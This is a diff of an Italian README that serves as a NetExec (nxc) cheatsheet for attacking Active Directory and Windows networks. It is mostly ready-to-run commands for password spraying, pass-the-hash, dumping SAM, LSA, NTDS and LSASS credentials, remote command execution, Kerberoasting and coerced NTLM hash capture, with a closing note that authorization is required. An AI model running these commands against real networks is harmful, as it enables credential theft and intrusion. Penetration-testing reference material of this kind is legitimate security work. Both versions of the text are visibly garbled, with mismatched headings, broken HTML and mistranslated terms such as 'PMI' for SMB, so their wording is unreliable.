@@ -1,12 +1,16 @@
-# ⚡ NetExec - Scheda di riferimento completa
-
 <!-- language-home-navigation -->
-[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# ⚡ NetExec (nxc) - Cheatsheet completo
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
   ███╗   ██╗███████╗████████╗███████╗██╗  ██╗███████╗ ██████╗ 
   ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝ 
@@ -16,121 +20,109 @@
   ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
         The Network Swiss Army Knife (CrackMapExec Successor)
 ```
-
-<p align="center">
+<palign="centro">
   <img src="https://img.shields.io/badge/NetExec-nxc-blue?style=for-the-badge" alt="NetExec">
-  <img src="https://img.shields.io/badge/CME_Successor-Active_Development-green?style=for-the-badge" alt="CME Successor">
-  <img src="https://img.shields.io/badge/Multi_Protocol-SMB_LDAP_MSSQL-orange?style=for-the-badge" alt="Multi-Protocol">
+  <img src="https://img.shields.io/badge/CME_Successor-Active_Development-green?style=for-the-badge" alt="Successore ECM">
+  <img src="https://img.shields.io/badge/Multi_Protocol-SMB_LDAP_MSSQL-orange?style=for-the-badge" alt="Multiprotocollo">
   <img src="https://img.shields.io/badge/Network-Pentesting-red?style=for-the-badge" alt="Network Pentesting">
 </p>
 
-<p align="center">
-  <b>🌐 The official, community-driven successor to CrackMapExec for network and Active Directory exploitation</b>
+<palign="centro">
+  <b>🌐 Il successore ufficiale di CrackMapExec, gestito dalla comunità, per lo sfruttamento della rete e di Active Directory</b>
 </p>
 
 ---
 
-## 📋 Indice
+## 📋 Sommario
 
-- [Introduzione](#-introduction)
-- [Why NetExec over CrackMapExec?](#-why-netexec-over-crackmapexec)
-- [Installazione](#-installation)
-- [Supported Protocols](#-supported-protocols)
-- [SMB Exploitation](#-smb-exploitation)
-  - [`nxc ftp` / `nxc vnc` - File Transfer & Virtual Network Computing](#reconnaissance--share-enumeration)
-  - [🛡️ SMB Exploitation](#password-spraying--credential-testing)
-  - [Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)](#pass-the-hash-pth--pass-the-ticket-ptt)
-  - [Credential Dumping (SAM, LSA, NTDS)](#credential-dumping-sam-lsa-ntds)
-  - [Esecuzione Comandi](#command-execution)
-- [LDAP Exploitation](#-ldap-exploitation)
-  - [Domain Enumeration & Password Policy](#domain-enumeration--password-policy)
-  - [🌳 LDAP Exploitation](#as-rep-roasting--kerberoasting)
+- [Introduzione](#-introduzione)
+- [Perché NetExec invece di CrackMapExec?](#-perché-netexec-over-crackmapexec)
+- [Installazione](#-installazione)
+- [Protocolli supportati](#-protocolli-supportati)
+- [Sfruttamento PMI](#-smb-sfruttamento)
+  - [Enumerazione ricognizione e condivisione](#ricognizione--enumerazione-condivisione)
+  - [Spray password e test credenziali](#spray-password--test-credenziali)
+  - [Passa l'hash (PtH) e Passa il biglietto (PtT)](#pass-the-hash-pth--pass-the-ticket-ptt)
+  - [Dumping delle credenziali (SAM, LSA, NTDS)](#credential-dumping-sam-lsa-ntds)
+  - [Esecuzione del comando](#esecuzione-comando)
+- [Sfruttamento LDAP](#-ldap-sfruttamento)
+  - [Enumerazione domini e policy password](#enumerazione-dominio--policy-password)
+  - [Torrefazione AS-REP e Kerberoasting](#as-rep-roasting--kerberoasting)
   - [LAPS & gMSA Extraction](#laps--gmsa-extraction)
-  - [BloodHound Data Ingestion](#bloodhound-data-ingestion)
-- [MSSQL Exploitation](#-mssql-exploitation)
-- [WinRM, RDP & SSH Modules](#-winrm-rdp--ssh-modules)
-- [Popular NetExec Modules (`-M`)](#-popular-netexec-modules--m)
-- [Workspaces & Built-in Database](#-workspaces--built-in-database)
-- [Riferimento rapido](#-quick-reference-table)
-- [Suggerimenti e buone pratiche](#-tips--best-practices)
-- [Legal Disclaimer](#-legal-disclaimer)
-- [Risorse e riferimenti](#-resources)
+  - [Ingestione dati Bloodhound](#bloodhound-data-ingestion)
+- [Sfruttamento MSSQL](#-mssql-sfruttamento)
+- [Moduli WinRM, RDP e SSH](#-winrm-rdp--ssh-modules)
+- [Moduli NetExec popolari (`-M`)](#-popular-netexec-modules--m)
+- [Aree di lavoro e database integrato](#-workspaces--built-in-database)
+- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
+- [Suggerimenti e best practice](#-tips--best-practice)
+- [Disclaimer legale](#-legal-disclaimer)
+- [Risorse](#-risorse)
 
 ---
 
 ## 🎯 Introduzione
 
-**NetExec** (`nxc`) is a multi-purpose post-exploitation tool designed to automate assessing large Active Directory and Windows networks. It is the official, active community fork and continuation of **CrackMapExec** (CME), created after CME was retired and archived by its original author.
+**NetExec** (`nxc`) è uno strumento post-exploitation multiuso progettato per automatizzare la valutazione di reti Active Directory e Windows di grandi dimensioni. È il fork ufficiale e attivo della comunità e la continuazione di **CrackMapExec** (CME), creato dopo che CME è stato ritirato e archiviato dal suo autore originale.
 
-NetExec acts as a network "Swiss Army knife," interfacing seamlessly with SMB, LDAP, MSSQL, WinRM, RDP, SSH, FTP, and VNC to automate authentication, credential dumping, vulnerability checks, and lateral movement.
-
----
-
-## ⚖️ Why NetExec over CrackMapExec?
-
-|Feature|CrackMapExec (CME)|NetExec (nxc)|
-|---------|--------------------|---------------|
-|**Development Status**|🛑 Archived / Deprecated|🟢 Actively Maintained|
-|**Python Support**|Legacy (Python 3.8-3.10)|Modern Python 3.10+|
-|**Protocol Support**|SMB, LDAP, MSSQL, WinRM, SSH|+ VNC, FTP, RDP, WMI enhancements|
-|**BloodHound Support**|BloodHound Legacy only|BloodHound CE & Legacy|
-|**Kerberos & PKINIT**|Limited|Robust PKINIT & Kerberos ticket support|
-|**Bug Fixes & Modules**|Frozen|Constantly updated CVE and exploit modules|
+NetExec funge da "coltellino svizzero" di rete, interfacciandosi perfettamente con SMB, LDAP, MSSQL, WinRM, RDP, SSH, FTP e VNC per automatizzare l'autenticazione, il dumping delle credenziali, i controlli di vulnerabilità e il movimento laterale.
 
 ---
 
-## 📥 Installazione
+## ⚖️ Perché NetExec invece di CrackMapExec?
 
-### |**Bug Fixes & Modules**|Frozen|Constantly updated CVE and exploit modules|
+| Caratteristica | CrackMapExec (CME) | NetExec (nxc) |
+|---------|--------------------|------|
+| **Stato di sviluppo** | 🛑 Archiviato/deprecato | 🟢 Mantenuto attivamente |
+| **Supporto Python** | Eredità (Python 3.8-3.10) | Python moderno 3.10+ |
+| **Supporto protocollo** | SMB, LDAP, MSSQL, WinRM, SSH | + Miglioramenti VNC, FTP, RDP, WMI |
+| **Supporto per BloodHound** | Solo BloodHound Legacy | BloodHound CE e Legacy |
+| **Kerberos e PKINIT** | Limitato | Robusto supporto per ticket PKINIT e Kerberos |
+| **Correzioni di bug e moduli** | Congelato | Moduli CVE e exploit costantemente aggiornati |
 
+---
+
+## 📥Installazione
+
+### Utilizzo di pipx (consigliato)
 ```bash
 pipx install netexec
 ```
-
 ### Kali Linux
 
-Using pipx (Recommended)
-
+NetExec è il sostituto ufficiale di CrackMapExec in Kali:
 ```bash
 sudo apt update && sudo apt install -y netexec
 ```
-
-### Kali Linux
-
+### Finestra mobile
 ```bash
 docker run -it --rm -v ~/.nxc:/root/.nxc ghcr.io/penny-os/netexec:latest smb 10.10.10.0/24
 ```
-
-### Verification
-
+### Verifica
 ```bash
 nxc --version
 ```
-
 ---
 
-## 🔌 Supported Protocols
+## 🔌 Protocolli supportati
 
-NetExec accepts the target protocol as its primary argument:
-
+NetExec accetta il protocollo di destinazione come argomento principale:
 ```bash
 nxc <protocol> <target(s)> [options]
 ```
-
-- 🔌 Supported Protocols
-- `nxc ldap` - Lightweight Directory Access Protocol (Kerberoasting, BloodHound, LAPS)
-- NetExec accepts the target protocol as its primary argument:
-- `nxc winrm` - Windows Remote Management (stealthy command execution)
-- `nxc rdp` - Remote Desktop Protocol (auth verification, screenshots)
-- `nxc ssh` - Secure Shell (Linux/UNIX credential testing & exec)
-- `nxc smb` - Server Message Block (shares, SAM/LSA/NTDS dumping, command exec)
+- `nxc smb` - Blocco messaggi server (condivisioni, dumping SAM/LSA/NTDS, comando exec)
+- `nxc ldap` - Protocollo di accesso alla directory leggero (Kerberoasting, BloodHound, LAPS)
+- `nxc mssql` - Microsoft SQL Server (query sul database, xp_cmdshell, rappresentazione)
+- `nxc winrm` - Gestione remota Windows (esecuzione furtiva dei comandi)
+- `nxc rdp` - Protocollo Desktop remoto (verifica autenticazione, screenshot)
+- `nxc ssh` - Secure Shell (test ed esecuzione delle credenziali Linux/UNIX)
+- `nxc ftp` / `nxc vnc` - Trasferimento file e elaborazione di rete virtuale
 
 ---
 
-## 🛡️ SMB Exploitation
+## 🛡️ Sfruttamento delle PMI
 
-### `nxc ftp` / `nxc vnc` - File Transfer & Virtual Network Computing
-
+### Enumerazione di ricognizione e condivisione
 ```bash
 # Discover live hosts and check SMB signing status
 nxc smb 10.10.10.0/24
@@ -145,9 +137,7 @@ nxc smb 10.10.10.0/24 -u 'alice' -p 'Welcome2026!' --shares
 # Spider shares for sensitive files (e.g., matching config, password, or bak)
 nxc smb 10.10.10.50 -u 'alice' -p 'Welcome2026!' -M spider_plus
 ```
-
-### 🛡️ SMB Exploitation
-
+### Applicazione di password e test delle credenziali
 ```bash
 # Check domain password policy before spraying (Prevents account lockouts!)
 nxc smb 10.10.10.1 -u 'alice' -p 'Welcome2026!' --pass-pol
@@ -158,9 +148,7 @@ nxc smb 10.10.10.1 -u users.txt -p 'SeasonYear2026!' --continue-on-success
 # Credential stuffing with user:pass pairs
 nxc smb 10.10.10.1 -u users.txt -p passwords.txt --no-bruteforce
 ```
-
-### Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)
-
+### Passa l'hash (PtH) e passa il biglietto (PtT)
 ```bash
 # Authenticate using NTLM hash
 nxc smb 10.10.10.0/24 -u 'Administrator' -H 'fc525c9680e4760a094da0c9ec5f0d94' --local-auth
@@ -169,9 +157,7 @@ nxc smb 10.10.10.0/24 -u 'Administrator' -H 'fc525c9680e4760a094da0c9ec5f0d94' -
 export KRB5CCNAME=/path/to/ticket.ccache
 nxc smb dc01.corp.local -k --shares
 ```
-
-### Credential Dumping (SAM, LSA, NTDS)
-
+### Dumping delle credenziali (SAM, LSA, NTDS)
 ```bash
 # Dump local SAM database (Requires administrative privileges)
 nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --sam
@@ -182,9 +168,7 @@ nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --lsa
 # Dump Active Directory NTDS.dit database via VSS on Domain Controller
 nxc smb 10.10.10.1 -u 'Administrator' -p 'Password123' --ntds
 ```
-
-### Esecuzione Comandi
-
+### Esecuzione del comando
 ```bash
 # Execute command via WMI (default)
 nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami /all'
@@ -195,13 +179,11 @@ nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -X 'Get-Process'
 # Execute command via SMBexec or atexec
 nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' --exec-method smbexec -x 'ipconfig'
 ```
-
 ---
 
-## 🌳 LDAP Exploitation
+## 🌳 Sfruttamento LDAP
 
-### Domain Enumeration & Password Policy
-
+### Enumerazione dei domini e politica della password
 ```bash
 # Dump domain users
 nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --users
@@ -212,9 +194,7 @@ nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --groups
 # Check for active domain computers
 nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --computers
 ```
-
-### 🌳 LDAP Exploitation
-
+### Arrostimento AS-REP e Kerberoasting
 ```bash
 # Identify and dump AS-REP Roastable accounts (DONT_REQ_PREAUTH)
 nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --asreproast asrep_hashes.txt
@@ -222,9 +202,7 @@ nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --asreproast asrep_hashes.txt
 # Request Kerberos Service Tickets (Kerberoasting)
 nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --kerberoasting kerberoast_hashes.txt
 ```
-
-### LAPS & gMSA Extraction
-
+### Estrazione GIRI e gMSA
 ```bash
 # Extract Microsoft LAPS (Local Administrator Password Solution) passwords
 nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M laps
@@ -232,18 +210,14 @@ nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M laps
 # Dump Group Managed Service Account (gMSA) passwords
 nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M gmsa
 ```
-
-### BloodHound Data Ingestion
-
+### Ingestione dati BloodHound
 ```bash
 # Collect BloodHound data natively over LDAP
 nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --bloodhound --collection All
 ```
-
 ---
 
-## 🗄️ MSSQL Exploitation
-
+## 🗄️ Sfruttamento di MSSQL
 ```bash
 # Test MSSQL authentication across network
 nxc mssql 10.10.10.0/24 -u 'sa' -p 'DatabasePassword!'
@@ -257,48 +231,43 @@ nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -x 'whoami'
 # Capture NetNTLMv2 hash by triggering xp_dirtree
 nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M capture-ntlm -o IP=192.168.1.100
 ```
-
 ---
 
-## 🚀 WinRM, RDP & SSH Modules
+## 🚀 Moduli WinRM, RDP e SSH
 
-### WinRM Command Execution
+### Esecuzione del comando WinRM
 ```bash
 nxc winrm 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami'
 ```
-
-### RDP Screenshotting & Auth
+### Screenshot e autenticazione RDP
 ```bash
 # Check RDP credentials and capture login screenshot
 nxc rdp 10.10.10.50 -u 'Administrator' -p 'Pass123' --screenshot
 ```
-
-### WinRM Command Execution
+### Spruzzatura e comandi SSH
 ```bash
 nxc ssh 10.10.10.0/24 -u 'root' -p 'toor' -x 'id'
 ```
-
 ---
 
-## 🧩 Popular NetExec Modules (`-M`)
+## 🧩 Moduli NetExec popolari (`-M`)
 
-|Module|Protocol|Descrizione|Esempio|
+| Modulo | Protocollo | Descrizione | Esempio |
 |--------|----------|-------------|---------|
-|`spooler`|SMB|Check if Print Spooler service is running (PrinterBug)|`nxc smb <IP> -M spooler`|
-|`zerologon`|SMB|Check for CVE-2020-1472 vulnerability|`nxc smb <IP> -M zerologon`|
-|`nopac`|SMB|Check for CVE-2021-42278 / CVE-2021-42287|`nxc smb <IP> -M nopac`|
-|`petitpotam`|SMB|Check if host is vulnerable to PetitPotam coercion|`nxc smb <IP> -M petitpotam`|
-|`nanodump`|SMB|Dump LSASS memory minidump stealthily using nanodump|`nxc smb <IP> -u admin -p pass -M nanodump`|
-|`webdav`|SMB|Check if WebClient service is active for WebDAV relay|`nxc smb <IP> -M webdav`|
-|`laps`|LDAP|Dump LAPS passwords for workstations|`nxc ldap <IP> -u u -p p -M laps`|
-|`gmsa`|LDAP|Extract Group Managed Service Account secrets|`nxc ldap <IP> -u u -p p -M gmsa`|
+| `spooler` | PMI | Controlla se il servizio Spooler di stampa è in esecuzione (PrinterBug) | `nxc smb <IP> -M spooler` |
+| `zerologon` | PMI | Verifica la vulnerabilità CVE-2020-1472 | `nxc smb <IP> -M zerologon` |
+| `nopac` | PMI | Verifica CVE-2021-42278 / CVE-2021-42287 | `nxc smb <IP> -M nopac` |
+| `petitpotam` | PMI | Controlla se l'host è vulnerabile alla coercizione di PetitPotam | `nxc smb <IP> -M petitpotam` |
+| `nanodump` | PMI | Scarica di nascosto il minidump della memoria LSASS utilizzando nanodump | `nxc smb <IP> -u admin -p pass -M nanodump` |
+| `webdav` | PMI | Controlla se il servizio WebClient è attivo per il relè WebDAV | `nxc smb <IP> -M webdav` |
+| `laps` | LDAP | Scarica le password LAPS per le workstation | `nxc ldap <IP> -u u -p p -M laps` |
+| `gmsa` | LDAP | Estrai i segreti dell'account del servizio gestito del gruppo | `nxc ldap <IP> -u u -p p -M gmsa` |
 
 ---
 
-## 💾 Workspaces & Built-in Database
+## 💾 Aree di lavoro e database integrato
 
-NetExec automatically records all discovered hosts, valid credentials, and dumped hashes into a local SQLite database (`~/.nxc/workspaces/`):
-
+NetExec registra automaticamente tutti gli host rilevati, le credenziali valide e gli hash scaricati in un database SQLite locale (`~/.nxc/workspaces/`):
 ```bash
 # View all stored credentials
 nxc-database credentials
@@ -310,44 +279,43 @@ nxc-database hosts
 nxc-database workspace create ClientAlpha
 nxc-database workspace switch ClientAlpha
 ```
-
 ---
 
-## 📊 Riferimento rapido
+## 📊 Tabella di consultazione rapida
 
-|Task|Protocol|Comando|
+| Compito | Protocollo | Comando |
 |------|----------|---------|
-|**Enumerate Shares**|SMB|`nxc smb <IP> -u '' -p '' --shares`|
-|**Check Pass Policy**|SMB|`nxc smb <DC> -u 'user' -p 'pass' --pass-pol`|
-|**Password Spray**|SMB|`nxc smb <IP> -u users.txt -p 'Pass' --continue-on-success`|
-|**Pass the Hash**|SMB|`nxc smb <IP> -u 'admin' -H <NT_HASH> --local-auth`|
-|**Dump SAM**|SMB|`nxc smb <IP> -u 'admin' -H <HASH> --sam`|
-|**Dump NTDS**|SMB|`nxc smb <DC> -u 'admin' -p 'pass' --ntds`|
-|**AS-REP Roasting**|LDAP|`nxc ldap <DC> -u 'user' -p 'pass' --asreproast hashes.txt`|
-|**Kerberoasting**|LDAP|`nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting hashes.txt`|
-|**BloodHound Dump**|LDAP|`nxc ldap <DC> -u 'user' -p 'pass' --bloodhound --collection All`|
-|**MSSQL xp_cmdshell**|MSSQL|`nxc mssql <IP> -u 'sa' -p 'pass' -x 'whoami'`|
+| **Elencare le azioni** | PMI | `nxc smb <IP> -u '' -p '' --shares` |
+| **Verifica la politica del pass** | PMI | `nxc smb <DC> -u 'user' -p 'pass' --pass-pol` |
+| **Spray password** | PMI | `nxc smb <IP> -u users.txt -p 'Pass' --continue-on-success` |
+| **Passa l'hash** | PMI | `nxc smb <IP> -u 'admin' -H <NT_HASH> --local-auth` |
+| **Scarica SAM** | PMI | `nxc smb <IP> -u 'admin' -H <HASH> --sam` |
+| **Scarica NTDS** | PMI | `nxc smb <DC> -u 'admin' -p 'pass' --ntds` |
+| **Torrefazione AS-REP** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --asreproast hashes.txt` |
+| **Kerberoasting** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting hashes.txt` |
+| **Discarica di BloodHound** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --bloodhound --collection All` |
+| **MSSQL xp_cmdshell**| MS SQL | `nxc mssql <IP> -u 'sa' -p 'pass' -x 'whoami'` |
 
 ---
 
-## 💡 Suggerimenti e buone pratiche
+## 💡 Suggerimenti e migliori pratiche
 
-1. **Always Check Password Policy First:**
-   Before launching any password spray, always run `nxc smb <DC> -u <USER> -p <PASS> --pass-pol` to inspect `Account Lockout Threshold`. If it's set to 3 or 5, spray only once every 30+ minutes to avoid locking domain accounts.
-2. **Use `--local-auth` for Workstations:**
-   When testing local admin credentials across workstations instead of domain credentials, always include the `--local-auth` flag.
-3. **Pivoting Integration:**
-   NetExec works seamlessly over SOCKS proxies (e.g. `proxychains nxc smb ...`) or over Ligolo-ng TUN interfaces with native speed!
-
----
-
-## ⚠️ Legal Disclaimer
-
-> **IMPORTANT:** NetExec is an offensive security assessment tool. It must strictly be used on computer networks and domain infrastructure where you have acquired explicit, documented authorization.
+1. **Controlla sempre prima la politica sulla password:**
+   Prima di lanciare qualsiasi spray per password, esegui sempre `nxc smb <DC> -u <USER> -p <PASS> --pass-pol` per ispezionare `Account Lockout Threshold`. Se è impostato su 3 o 5, spruzza solo una volta ogni 30+ minuti per evitare di bloccare gli account di dominio.
+2. **Utilizza `--local-auth` per workstation:**
+   Quando si testano le credenziali di amministratore locale su workstation anziché le credenziali di dominio, includere sempre il flag `--local-auth`.
+3. **Integrazione pivot:**
+   NetExec funziona perfettamente sui proxy SOCKS (ad esempio `proxychains nxc smb ...`) o sulle interfacce TUN Ligolo-ng con velocità nativa!
 
 ---
 
-## 📚 Risorse e riferimenti
+## ⚠️ Disclaimer legale
 
-- [NetExec Official GitHub Repository](https://github.com/Pennyw0rth/NetExec)
-- [Official NetExec Documentation](https://www.netexec.wiki/)
+> **IMPORTANTE:** NetExec è uno strumento offensivo di valutazione della sicurezza. Il suo utilizzo deve essere tassativamente effettuato su reti informatiche e infrastrutture di dominio dove sia stata acquisita esplicita e documentata autorizzazione.
+
+---
+
+## 📚 Risorse
+
+- [Repository GitHub ufficiale NetExec](https://github.com/Pennyw0rth/NetExec)
+- [Documentazione ufficiale NetExec](https://www.netexec.wiki/)
